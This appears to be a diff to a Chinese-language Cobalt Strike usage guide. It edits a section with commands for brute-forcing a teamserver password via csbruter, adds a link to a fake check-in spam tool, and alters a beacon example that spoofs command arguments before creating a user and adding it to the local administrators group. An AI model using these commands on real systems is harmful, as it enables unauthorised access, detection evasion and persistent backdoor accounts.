@@ -53,12 +53,15 @@ Cobalt Strike 可以使用 AggressorScripts 脚本来加强自身，能够扩展
 - [rsmudge/Malleable-C2-Profiles](https://github.com/rsmudge/Malleable-C2-Profiles)
 - [threatexpress/malleable-c2](https://github.com/threatexpress/malleable-c2)
 
-**爆破 cobaltstrike teamserver**
+**爆破 cobaltstrike teamserver 密码**
 ```bash
 git clone https://github.com/ryanohoro/csbruter
 cd csbruter
 cat wordlist.txt | python3 csbruter.py xxx.xxx.xxx.xxx
 ```
+
+**发送假上线信息**
+- [hariomenkel/CobaltSpam](https://github.com/hariomenkel/CobaltSpam)
 
 ---
 
@@ -784,7 +787,7 @@ argue [command]
 argue 命令 取消欺骗某个命令参数
 
 beacon> argue net1 /bypassbypassbypassbypassbypassbypassbypassbypassbypassbypassbypassbypassbypass
-beacon> run net1 user what t1!@#1dsdfq3 /add
+beacon> run net1 user demouser Abcd!@#$12 /add
 beacon> run net1 localgroup administrators what /add
 ```
 
